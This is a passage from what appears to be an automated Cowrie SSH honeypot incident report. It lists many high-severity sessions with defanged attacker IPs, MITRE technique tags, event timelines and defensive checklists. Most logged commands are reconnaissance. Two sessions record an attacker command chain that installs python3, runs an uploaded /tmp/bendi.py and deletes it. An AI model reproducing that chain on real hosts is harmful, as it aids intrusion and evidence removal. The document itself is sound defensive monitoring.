| `2026-08-04 17:13:43` | `cowrie.session.connect` |
| `2026-08-04 17:13:44` | `cowrie.client.version` |
| `2026-08-04 17:13:44` | `cowrie.client.kex` |
| `2026-08-04 17:13:46` | `cowrie.login.success` |
| `2026-08-04 17:13:47` | `cowrie.direct-tcpip.request` |
| `2026-08-04 17:13:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.146.217[.]105` to AbuseIPDB if not already reported
- [ ] Block `34.146.217[.]105` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a1f3d9874fa

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:15 |
| **Last Seen** | 2026-08-04 17:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:15:49` | `cowrie.session.connect` |
| `2026-08-04 17:15:49` | `cowrie.client.version` |
| `2026-08-04 17:15:49` | `cowrie.client.kex` |
| `2026-08-04 17:15:49` | `cowrie.login.success` |
| `2026-08-04 17:15:50` | `cowrie.session.params` |
| `2026-08-04 17:15:50` | `cowrie.command.input` |
| `2026-08-04 17:15:50` | `cowrie.log.closed` |
| `2026-08-04 17:15:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af5817c185dc

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:17 |
| **Last Seen** | 2026-08-04 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:17:48` | `cowrie.session.connect` |
| `2026-08-04 17:17:48` | `cowrie.client.version` |
| `2026-08-04 17:17:48` | `cowrie.client.kex` |
| `2026-08-04 17:17:48` | `cowrie.login.success` |
| `2026-08-04 17:17:49` | `cowrie.session.params` |
| `2026-08-04 17:17:49` | `cowrie.command.input` |
| `2026-08-04 17:17:49` | `cowrie.log.closed` |
| `2026-08-04 17:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2a414edf92f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:19 |
| **Last Seen** | 2026-08-04 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:19:40` | `cowrie.session.connect` |
| `2026-08-04 17:19:40` | `cowrie.client.version` |
| `2026-08-04 17:19:40` | `cowrie.client.kex` |
| `2026-08-04 17:19:40` | `cowrie.login.success` |
| `2026-08-04 17:19:41` | `cowrie.session.params` |
| `2026-08-04 17:19:41` | `cowrie.command.input` |
| `2026-08-04 17:19:41` | `cowrie.log.closed` |
| `2026-08-04 17:19:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56ae36ab501e

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]67` |
| **First Seen** | 2026-08-04 17:20 |
| **Last Seen** | 2026-08-04 17:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:20:13` | `cowrie.session.connect` |
| `2026-08-04 17:20:13` | `cowrie.client.version` |
| `2026-08-04 17:20:13` | `cowrie.client.kex` |
| `2026-08-04 17:20:13` | `cowrie.login.success` |
| `2026-08-04 17:20:13` | `cowrie.direct-tcpip.request` |
| `2026-08-04 17:20:14` | `cowrie.direct-tcpip.data` |
| `2026-08-04 17:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]67` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b7c5b2de575

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]107` |
| **First Seen** | 2026-08-04 17:20 |
| **Last Seen** | 2026-08-04 17:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:20:53` | `cowrie.session.connect` |
| `2026-08-04 17:20:53` | `cowrie.client.version` |
| `2026-08-04 17:20:53` | `cowrie.client.kex` |
| `2026-08-04 17:20:54` | `cowrie.login.success` |
| `2026-08-04 17:20:54` | `cowrie.direct-tcpip.request` |
| `2026-08-04 17:20:54` | `cowrie.direct-tcpip.data` |
| `2026-08-04 17:20:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]107` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6074271920f4

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:21 |
| **Last Seen** | 2026-08-04 17:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:21:33` | `cowrie.session.connect` |
| `2026-08-04 17:21:33` | `cowrie.client.version` |
| `2026-08-04 17:21:34` | `cowrie.client.kex` |
| `2026-08-04 17:21:34` | `cowrie.login.success` |
| `2026-08-04 17:21:34` | `cowrie.session.params` |
| `2026-08-04 17:21:34` | `cowrie.command.input` |
| `2026-08-04 17:21:35` | `cowrie.log.closed` |
| `2026-08-04 17:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b14d5ee5d46

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-04 17:22 |
| **Last Seen** | 2026-08-04 17:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:22:32` | `cowrie.session.connect` |
| `2026-08-04 17:22:32` | `cowrie.client.version` |
| `2026-08-04 17:22:32` | `cowrie.client.kex` |
| `2026-08-04 17:22:32` | `cowrie.login.success` |
| `2026-08-04 17:22:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79a39ed60b5e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-04 17:22 |
| **Last Seen** | 2026-08-04 17:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:22:34` | `cowrie.session.connect` |
| `2026-08-04 17:22:34` | `cowrie.client.version` |
| `2026-08-04 17:22:34` | `cowrie.client.kex` |
| `2026-08-04 17:22:34` | `cowrie.login.success` |
| `2026-08-04 17:22:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a40f0a86ad79

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-04 17:22 |
| **Last Seen** | 2026-08-04 17:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:22:35` | `cowrie.session.connect` |
| `2026-08-04 17:22:35` | `cowrie.client.version` |
| `2026-08-04 17:22:35` | `cowrie.client.kex` |
| `2026-08-04 17:22:35` | `cowrie.login.success` |
| `2026-08-04 17:22:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c39ba14332f3

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:23 |
| **Last Seen** | 2026-08-04 17:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:23:31` | `cowrie.session.connect` |
| `2026-08-04 17:23:31` | `cowrie.client.version` |
| `2026-08-04 17:23:31` | `cowrie.client.kex` |
| `2026-08-04 17:23:32` | `cowrie.login.success` |
| `2026-08-04 17:23:32` | `cowrie.session.params` |
| `2026-08-04 17:23:32` | `cowrie.command.input` |
| `2026-08-04 17:23:33` | `cowrie.log.closed` |
| `2026-08-04 17:23:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b34d21e45c10

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:25 |
| **Last Seen** | 2026-08-04 17:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:25:24` | `cowrie.session.connect` |
| `2026-08-04 17:25:24` | `cowrie.client.version` |
| `2026-08-04 17:25:24` | `cowrie.client.kex` |
| `2026-08-04 17:25:24` | `cowrie.login.success` |
| `2026-08-04 17:25:25` | `cowrie.session.params` |
| `2026-08-04 17:25:25` | `cowrie.command.input` |
| `2026-08-04 17:25:25` | `cowrie.log.closed` |
| `2026-08-04 17:25:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dde46720122

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-08-04 17:25 |
| **Last Seen** | 2026-08-04 17:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:25:36` | `cowrie.session.connect` |
| `2026-08-04 17:25:36` | `cowrie.client.version` |
| `2026-08-04 17:25:36` | `cowrie.client.kex` |
| `2026-08-04 17:25:37` | `cowrie.login.success` |
| `2026-08-04 17:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f20b6999f78

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-08-04 17:25 |
| **Last Seen** | 2026-08-04 17:27 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:25:38` | `cowrie.session.connect` |
| `2026-08-04 17:25:38` | `cowrie.client.version` |
| `2026-08-04 17:25:38` | `cowrie.client.kex` |
| `2026-08-04 17:25:39` | `cowrie.login.success` |
| `2026-08-04 17:25:41` | `cowrie.session.file_upload` |
| `2026-08-04 17:25:42` | `cowrie.session.params` |
| `2026-08-04 17:25:42` | `cowrie.command.input` |
| `2026-08-04 17:25:42` | `cowrie.command.input` |
| `2026-08-04 17:25:42` | `cowrie.command.input` |
| `2026-08-04 17:25:42` | `cowrie.command.failed` |
| `2026-08-04 17:25:42` | `cowrie.log.closed` |
| `2026-08-04 17:25:43` | `cowrie.session.params` |
| `2026-08-04 17:25:43` | `cowrie.command.input` |
| `2026-08-04 17:25:43` | `cowrie.log.closed` |
| `2026-08-04 17:25:44` | `cowrie.session.params` |
| `2026-08-04 17:25:44` | `cowrie.command.input` |
| `2026-08-04 17:25:44` | `cowrie.log.closed` |
| `2026-08-04 17:25:46` | `cowrie.session.params` |
| `2026-08-04 17:25:46` | `cowrie.command.input` |
| `2026-08-04 17:25:46` | `cowrie.command.failed` |
| `2026-08-04 17:25:46` | `cowrie.command.failed` |
| `2026-08-04 17:26:47` | `cowrie.session.params` |
| `2026-08-04 17:26:47` | `cowrie.command.input` |
| `2026-08-04 17:27:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5820b5c572fb

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-08-04 17:25 |
| **Last Seen** | 2026-08-04 17:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:25:39` | `cowrie.session.connect` |
| `2026-08-04 17:25:39` | `cowrie.client.version` |
| `2026-08-04 17:25:40` | `cowrie.client.kex` |
| `2026-08-04 17:25:41` | `cowrie.login.success` |
| `2026-08-04 17:25:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1147e33bc4e1

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:27 |
| **Last Seen** | 2026-08-04 17:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:27:14` | `cowrie.session.connect` |
| `2026-08-04 17:27:14` | `cowrie.client.version` |
| `2026-08-04 17:27:14` | `cowrie.client.kex` |
| `2026-08-04 17:27:15` | `cowrie.login.success` |
| `2026-08-04 17:27:16` | `cowrie.session.params` |
| `2026-08-04 17:27:16` | `cowrie.command.input` |
| `2026-08-04 17:27:16` | `cowrie.log.closed` |
| `2026-08-04 17:27:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d1712af4b94

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-08-04 17:27 |
| **Last Seen** | 2026-08-04 17:30 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:27:57` | `cowrie.session.connect` |
| `2026-08-04 17:27:57` | `cowrie.client.version` |
| `2026-08-04 17:27:57` | `cowrie.client.kex` |
| `2026-08-04 17:27:58` | `cowrie.login.success` |
| `2026-08-04 17:28:00` | `cowrie.session.file_upload` |
| `2026-08-04 17:28:01` | `cowrie.session.params` |
| `2026-08-04 17:28:01` | `cowrie.command.input` |
| `2026-08-04 17:28:01` | `cowrie.command.input` |
| `2026-08-04 17:28:01` | `cowrie.command.input` |
| `2026-08-04 17:28:01` | `cowrie.command.failed` |
| `2026-08-04 17:28:01` | `cowrie.log.closed` |
| `2026-08-04 17:28:02` | `cowrie.session.params` |
| `2026-08-04 17:28:02` | `cowrie.command.input` |
| `2026-08-04 17:28:02` | `cowrie.log.closed` |
| `2026-08-04 17:28:03` | `cowrie.session.params` |
| `2026-08-04 17:28:03` | `cowrie.command.input` |
| `2026-08-04 17:28:03` | `cowrie.log.closed` |
| `2026-08-04 17:28:05` | `cowrie.session.params` |
| `2026-08-04 17:28:05` | `cowrie.command.input` |
| `2026-08-04 17:28:05` | `cowrie.command.failed` |
| `2026-08-04 17:28:05` | `cowrie.command.failed` |
| `2026-08-04 17:29:06` | `cowrie.session.params` |
| `2026-08-04 17:29:06` | `cowrie.command.input` |
| `2026-08-04 17:30:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c893618f4f41

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]206` |
| **First Seen** | 2026-08-04 17:28 |
| **Last Seen** | 2026-08-04 17:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:28:53` | `cowrie.session.connect` |
| `2026-08-04 17:28:53` | `cowrie.client.version` |
| `2026-08-04 17:28:53` | `cowrie.client.kex` |
| `2026-08-04 17:28:54` | `cowrie.login.success` |
| `2026-08-04 17:28:54` | `cowrie.direct-tcpip.request` |
| `2026-08-04 17:28:54` | `cowrie.direct-tcpip.data` |
| `2026-08-04 17:28:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]206` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9b760c5d373

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:29 |
| **Last Seen** | 2026-08-04 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:29:11` | `cowrie.session.connect` |
| `2026-08-04 17:29:11` | `cowrie.client.version` |
| `2026-08-04 17:29:11` | `cowrie.client.kex` |
| `2026-08-04 17:29:12` | `cowrie.login.success` |
| `2026-08-04 17:29:12` | `cowrie.session.params` |
| `2026-08-04 17:29:12` | `cowrie.command.input` |
| `2026-08-04 17:29:12` | `cowrie.log.closed` |
| `2026-08-04 17:29:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8522ab484a58

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:31 |
| **Last Seen** | 2026-08-04 17:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:31:06` | `cowrie.session.connect` |
| `2026-08-04 17:31:06` | `cowrie.client.version` |
| `2026-08-04 17:31:06` | `cowrie.client.kex` |
| `2026-08-04 17:31:07` | `cowrie.login.success` |
| `2026-08-04 17:31:08` | `cowrie.session.params` |
| `2026-08-04 17:31:08` | `cowrie.command.input` |
| `2026-08-04 17:31:08` | `cowrie.log.closed` |
| `2026-08-04 17:31:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7abdb318dcb7

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:32 |
| **Last Seen** | 2026-08-04 17:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:32:59` | `cowrie.session.connect` |
| `2026-08-04 17:32:59` | `cowrie.client.version` |
| `2026-08-04 17:32:59` | `cowrie.client.kex` |
| `2026-08-04 17:32:59` | `cowrie.login.success` |
| `2026-08-04 17:33:00` | `cowrie.session.params` |
| `2026-08-04 17:33:00` | `cowrie.command.input` |
| `2026-08-04 17:33:00` | `cowrie.log.closed` |
| `2026-08-04 17:33:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4c3c0a43086

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-04 17:34 |
| **Last Seen** | 2026-08-04 17:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:34:00` | `cowrie.session.connect` |
| `2026-08-04 17:34:00` | `cowrie.client.version` |
| `2026-08-04 17:34:00` | `cowrie.client.kex` |
| `2026-08-04 17:34:01` | `cowrie.login.success` |
| `2026-08-04 17:34:01` | `cowrie.direct-tcpip.request` |
| `2026-08-04 17:34:01` | `cowrie.direct-tcpip.data` |
| `2026-08-04 17:34:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d974c05d39fc

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:34 |
| **Last Seen** | 2026-08-04 17:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:34:57` | `cowrie.session.connect` |
| `2026-08-04 17:34:57` | `cowrie.client.version` |
| `2026-08-04 17:34:57` | `cowrie.client.kex` |
| `2026-08-04 17:34:58` | `cowrie.login.success` |
| `2026-08-04 17:34:58` | `cowrie.session.params` |
| `2026-08-04 17:34:58` | `cowrie.command.input` |
| `2026-08-04 17:34:58` | `cowrie.log.closed` |
| `2026-08-04 17:34:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-299aa9eeade5

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 17:36 |
| **Last Seen** | 2026-08-04 17:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:36:58` | `cowrie.session.connect` |
| `2026-08-04 17:36:58` | `cowrie.client.version` |
| `2026-08-04 17:36:58` | `cowrie.client.kex` |
| `2026-08-04 17:36:59` | `cowrie.login.success` |
| `2026-08-04 17:37:00` | `cowrie.session.params` |
| `2026-08-04 17:37:00` | `cowrie.command.input` |
| `2026-08-04 17:37:00` | `cowrie.log.closed` |
| `2026-08-04 17:37:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10fdc246f964

| Field | Detail |
|---|---|
| **Source IP** | `118.26.153[.]102` |
| **First Seen** | 2026-08-04 17:37 |
| **Last Seen** | 2026-08-04 17:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 17:37:39` | `cowrie.session.connect` |
| `2026-08-04 17:37:40` | `cowrie.client.version` |
| `2026-08-04 17:37:40` | `cowrie.client.kex` |
| `2026-08-04 17:37:42` | `cowrie.login.success` |
| `2026-08-04 17:37:43` | `cowrie.direct-tcpip.request` |
| `2026-08-04 17:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.153[.]102` to AbuseIPDB if not already reported
- [ ] Block `118.26.153[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
